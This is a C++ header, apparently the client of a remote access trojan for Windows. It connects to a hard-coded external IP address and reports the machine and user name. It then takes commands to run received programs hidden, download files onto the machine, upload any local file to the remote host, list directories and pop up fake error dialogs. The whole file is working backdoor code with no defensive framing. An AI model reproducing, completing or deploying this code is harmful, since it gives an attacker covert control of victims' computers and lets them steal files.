#pragma once

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#define PORT 1291

class connection {
	const char* IP = "34.201.57.31";
	WSADATA wsdata;
	SOCKET sock;
	sockaddr_in config;
	public:
	

	connection(long &connect_status) {
		
		if (WSAStartup(MAKEWORD(2, 2), &wsdata)) {
			connect_status = 1;
			return;
		}
		sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock == INVALID_SOCKET) {
			connect_status = 3;
			return;
		}
		config.sin_port = htons(PORT);
		
		config.sin_family = AF_INET;
		inet_pton(AF_INET, IP, &config.sin_addr);
		for (int i = 0; i < 5; i++) {
			if (connect(sock, (sockaddr*)&config, sizeof(config))) {

				connect_status = 2;

			}
			else {
				DWORD len= 100;
				char name[100]; GetComputerNameA(name, &len);
				send(sock, (char*)&name, 100, 0);
				len = 64;
				char username[64]; GetUserNameA(username, &len);
				send(sock, (char*)&username, 64, 0);
				connect_status = 0;
				break;
			}
			Sleep(5000);
		}

	}
	void RunFile() {
		char* path = new char[256];
		recv(sock, path, 256, 0);
		WinExec(path, SW_HIDE);
		
	}
	void OpenGetFileChannel() {
		size_t buffersize = 0;
		recv(sock, (char*)&buffersize, sizeof(buffersize), 0);
		char* filename = new char[1024];
		recv(sock, filename, 1024, 0);
		HANDLE file = CreateFileA(filename, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		char *buffer = new char [buffersize];
		DWORD iRead = 0;
		DWORD iWritten = 0;
		DWORD pack = 0;
		std::ofstream out("log.txt");
		recv(sock, (char*)&iRead, sizeof(DWORD), 0);
		
		while (iRead > 0) {
			
			recv(sock, buffer, iRead, MSG_WAITALL);
			WriteFile(file, buffer, iRead, &iWritten, 0);
			pack++;
			recv(sock, (char*)&iRead, sizeof(DWORD), MSG_WAITALL);
		}
		out.close();
#ifdef DEBUG_MODE
		std::string a = std::to_string(pack);
		MessageBoxA(NULL, a.c_str(), "END", MB_OK);
#endif
		CloseHandle(file);
		delete[]buffer;
		return;
	}
	void OpenSendFileChannel() {
		size_t buffersize = 0;
		recv(sock, (char*)&buffersize, sizeof(buffersize), 0);
		char* filename = new char[1024];
		recv(sock, filename, 1024 * sizeof(char), 0);
		HANDLE file = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD iRead = 1;
		char* buffer = new char[buffersize];
		while (ReadFile(file, buffer, buffersize, &iRead, NULL) && iRead > 0) {
			send(sock, (char*)&iRead, sizeof(DWORD), 0);
			send(sock, buffer, buffersize, 0);
		}
		iRead = 0;
		send(sock, (char*)&iRead, sizeof(iRead), 0);
#ifdef DEBUG_MODE
		MessageBoxA(NULL, "Done!", "END", MB_OK);
#endif
		
		CloseHandle(file);

	}

	void pong() {
		
		char c[5] = "pong";
		send(sock, (char*) & c, 5, 0);
	}
	char command() {
		char cmd;
		recv(sock, (char*)&cmd, sizeof(cmd), 0);
		return cmd;
	}
	void CallError() {
		char buffer[256];
		char cap[20];
		recv(sock, cap, 20, 0);
		recv(sock, buffer, 256, 0);
		MessageBoxA(NULL, buffer, cap, MB_ICONERROR );
	}
	
	void SendDir() {
		char path[1024];
		recv(sock, (char*)&path, 1024, 0);
		
		WIN32_FIND_DATAA wfd;
		strcat(path, "*");
		HANDLE const hFind = FindFirstFileA(path, &wfd);

		if (INVALID_HANDLE_VALUE != hFind)
		{
			do
			{
				char* s = new char[512];
				int i;
				for ( i = 0; wfd.cFileName[i] != '\0' && i <512; i++)
					s[i] = wfd.cFileName[i];
				s[i] = '\0';
				send(sock, s, 512, 0);
				delete[]s;
			} while (NULL != FindNextFileA(hFind, &wfd));

			FindClose(hFind);
		}
		char buff[512] = "\\StreamEnd";
		send(sock, buff, 512, 0);
	}
	
	~connection() {
		
		WSACleanup();
		closesocket(sock);

	}
};